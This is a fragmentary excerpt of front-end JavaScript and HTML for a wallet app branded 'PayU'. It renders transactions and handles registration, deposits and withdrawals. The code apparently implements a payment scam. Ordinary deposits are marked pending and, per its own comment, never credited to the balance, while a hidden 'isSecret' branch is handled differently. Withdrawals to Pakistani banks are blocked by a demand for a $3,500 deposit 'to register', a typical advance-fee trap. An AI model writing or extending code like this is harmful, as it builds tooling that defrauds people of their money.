...
function renderTransactions() {
  ...
  list.innerHTML = State.transactions.map((tx, i) => {
    ...
    const statusBadge = isPending
      ? `<div style="font-size:10px;color:#f59e0b;letter-spacing:0.5px;text-transform:uppercase;font-weight:600">⏳ Pending</div>`
      : `<div style="font-size:10px;color:var(--text-muted);letter-spacing:0.5px;text-transform:uppercase">${tx.type}</div>`;

    return `
      <div class="tx-item" style="animation-delay:${i * 0.05}s;cursor:pointer;${isPending ? 'opacity:0.75' : ''}" onclick="showReceipt(${tx.id})">
        <div class="tx-icon" style="background:${isPending ? 'rgba(245,158,11,0.1)' : meta.bg}">${isPending ? '⏳' : meta.icon}</div>
        <div class="tx-info">
          <div class="tx-name">${tx.label}</div>
          <div class="tx-date">${dateStr} · ${timeStr}</div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
          <div class="tx-amount ${isPositive ? 'positive' : 'negative'}" style="${isPending ? 'color:#f59e0b' : ''}">${sign}${formatCurrency(tx.amount, tx.currency || 'USD')}</div>
          ${statusBadge}
        </div>
      </div>
    `;
...
function handleRegister(e) {
  ...
  // Show pending notification via popup sheet
  setTimeout(() => {
    showPopup(
      'Account Pending Approval',
      'Your account registration has been submitted successfully. It is currently under review by the PayU Team. You will be notified once your account is approved and activated.',
      '⏳'
    );
  }, 300);
}
...
function handleDeposit(e) {
  ...
  setTimeout(() => {
    if (isSecret) {
      ...
      // Normal deposit — goes to pending, balance NOT credited
      State.addTransaction({
        type: 'deposit',
        label: `Deposit via ${bank} (Pending)`,
        amount,
        currency,
        note,
        iban,
      ...
      showPopup(
        'Deposit Pending',
        `Your deposit of ${formatCurrency(amount, currency)} via ${bank} is under review. It will be credited to your wallet once verified (typically 1–3 business days).`,
        '⏳'
      );
      Screens.renderHome();
    }
  ...
  setTimeout(() => {
    if (country === 'PK') {
      showPopup(
        ...
        'You cannot withdraw to Pakistani banks without first depositing $3,500 from your Pakistani Bank into your PayU account to register with PayU.',
        '🚫'
      );
    } else {
      State.balance -= amount;
    ...
    <div id="app">
      ...
      <div id="login-screen" class="screen active" style="padding-bottom:32px">
        <div class="login-logo">
          <div class="logo-icon">
            <img src="icons/icon-512.png" width="50" height="50" alt="PayU" style="border-radius:10px;display:block">
          </div>
